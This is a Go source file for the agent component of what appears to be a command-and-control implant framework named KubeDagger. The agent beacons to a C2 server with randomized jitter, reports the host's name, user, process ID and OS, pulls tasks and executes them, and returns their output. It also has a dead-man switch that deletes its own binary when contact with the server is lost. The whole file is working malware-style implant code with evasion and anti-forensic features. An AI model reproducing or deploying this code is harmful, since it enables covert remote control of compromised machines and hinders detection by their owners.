package agent

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"os/user"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/c2server"
)

type Config struct {
	ServerURL     string
	AgentID       string
	BeaconJitter  float64
	MaxRetries    int
	RetryInterval time.Duration
	InitialDelay  time.Duration
	MaxOutput     int
	// DeadmanTimeout triggers self-destruct when no successful C2 checkin
	// occurs within this window. 0 disables the watchdog (default).
	DeadmanTimeout time.Duration
}

type Agent struct {
	cfg       Config
	transport *Transport
	executor  *Executor
	stop      chan struct{}
	stopOnce  sync.Once

	// lastContact holds the unix-nano timestamp of the last successful
	// checkin; read by the dead-man watchdog.
	lastContact atomic.Int64

	deadmanMu  sync.Mutex
	deadmanErr error
}

func New(cfg Config, transport *Transport) *Agent {
	if cfg.AgentID == "" {
		cfg.AgentID = generateAgentID()
	}
	if cfg.BeaconJitter == 0 {
		cfg.BeaconJitter = 0.2
	}
	if cfg.MaxRetries == 0 {
		cfg.MaxRetries = 5
	}
	if cfg.RetryInterval == 0 {
		cfg.RetryInterval = 10 * time.Second
	}

	executor := NewExecutor()
	if cfg.MaxOutput > 0 {
		executor.MaxOutput = cfg.MaxOutput
	}

	return &Agent{
		cfg:       cfg,
		transport: transport,
		executor:  executor,
		stop:      make(chan struct{}),
	}
}

func (a *Agent) Run(ctx context.Context) error {
	logrus.Infof("agent %s starting (server: %s)", a.cfg.AgentID, a.cfg.ServerURL)

	a.lastContact.Store(time.Now().UnixNano())

	if a.cfg.DeadmanTimeout > 0 {
		go a.deadmanWatchdog(ctx)
	}

	if a.cfg.InitialDelay > 0 {
		delay := a.jitteredSleep(a.cfg.InitialDelay)
		logrus.Debugf("initial delay: %s", delay)
		a.sleep(ctx, delay)
	}

	failures := 0
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-a.stop:
			return a.getDeadmanErr()
		default:
		}

		sleepSec, err := a.checkin()
		if err != nil {
			failures++
			logrus.Warnf("checkin failed (%d/%d): %v", failures, a.cfg.MaxRetries, err)
			if failures >= a.cfg.MaxRetries {
				logrus.Error("max retries reached, backing off")
				a.sleep(ctx, a.cfg.RetryInterval*time.Duration(failures))
			} else {
				a.sleep(ctx, a.cfg.RetryInterval)
			}
			continue
		}
		failures = 0
		a.lastContact.Store(time.Now().UnixNano())

		a.processTasks(ctx)
		a.sleep(ctx, a.jitteredSleep(time.Duration(sleepSec)*time.Second))
	}
}

// deadmanWatchdog periodically verifies that the agent has checked in with
// the C2 server inside the configured window; otherwise it self-destructs.
func (a *Agent) deadmanWatchdog(ctx context.Context) {
	interval := a.cfg.DeadmanTimeout / 4
	if interval > 30*time.Second {
		interval = 30 * time.Second
	}
	if interval <= 0 {
		interval = time.Second
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-a.stop:
			return
		case <-ticker.C:
			last := time.Unix(0, a.lastContact.Load())
			if time.Since(last) > a.cfg.DeadmanTimeout {
				a.selfDestruct()
				return
			}
		}
	}
}

// selfDestruct fires the dead-man switch: best-effort removal of the agent
// binary followed by termination of the agent loop.
func (a *Agent) selfDestruct() {
	logrus.Errorf("dead-man switch triggered: no C2 contact in %s", a.cfg.DeadmanTimeout)

	if runtime.GOOS != "windows" {
		if err := os.Remove(os.Args[0]); err != nil {
			logrus.Debugf("self-destruct: could not remove binary %s: %v", os.Args[0], err)
		} else {
			logrus.Debug("self-destruct: agent binary removed")
		}
	}

	a.deadmanMu.Lock()
	a.deadmanErr = fmt.Errorf("dead-man switch triggered: no C2 contact in %s", a.cfg.DeadmanTimeout)
	a.deadmanMu.Unlock()
	a.shutdown()
}

func (a *Agent) getDeadmanErr() error {
	a.deadmanMu.Lock()
	defer a.deadmanMu.Unlock()
	return a.deadmanErr
}

func (a *Agent) shutdown() {
	a.stopOnce.Do(func() {
		close(a.stop)
	})
}

func (a *Agent) Stop() {
	a.shutdown()
}

func (a *Agent) checkin() (int, error) {
	hostname, _ := os.Hostname()
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	req := c2server.CheckinRequest{
		AgentID:  a.cfg.AgentID,
		Hostname: hostname,
		OS:       c2server.AgentOS(runtime.GOOS),
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
		User:     username,
	}

	resp, err := a.transport.Checkin(req)
	if err != nil {
		return 30, err
	}
	return resp.SleepInterval, nil
}

func (a *Agent) processTasks(ctx context.Context) {
	first := true
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		if !first {
			n, _ := rand.Int(rand.Reader, big.NewInt(400))
			a.sleep(ctx, time.Duration(100+n.Int64())*time.Millisecond)
		}
		first = false

		task, err := a.transport.GetTask(a.cfg.AgentID)
		if err != nil {
			logrus.Warnf("get task failed: %v", err)
			return
		}
		if task == nil {
			return
		}

		logrus.Infof("executing task %s (type: %s)", task.TaskID, task.Type)

		if task.Type == c2server.TaskExit {
			a.sendResult(task.TaskID, "exiting", "")
			a.Stop()
			return
		}

		output, execErr := a.executor.Execute(ctx, task)

		errStr := ""
		if execErr != nil {
			errStr = execErr.Error()
		}
		a.sendResult(task.TaskID, output, errStr)
	}
}

func (a *Agent) sendResult(taskID, output, errStr string) {
	status := c2server.StatusCompleted
	if errStr != "" {
		status = c2server.StatusFailed
	}

	result := c2server.ResultRequest{
		AgentID: a.cfg.AgentID,
		TaskID:  taskID,
		Status:  status,
		Output:  output,
		Error:   errStr,
	}

	if err := a.transport.SendResult(result); err != nil {
		logrus.Warnf("send result failed for task %s: %v", taskID, err)
	}
}

func (a *Agent) jitteredSleep(base time.Duration) time.Duration {
	jitter := float64(base) * a.cfg.BeaconJitter
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(jitter*2)))
	offset := time.Duration(n.Int64()) - time.Duration(jitter)
	return base + offset
}

func (a *Agent) sleep(ctx context.Context, d time.Duration) {
	timer := time.NewTimer(d)
	defer timer.Stop()
	select {
	case <-ctx.Done():
	case <-a.stop:
	case <-timer.C:
	}
}

func generateAgentID() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
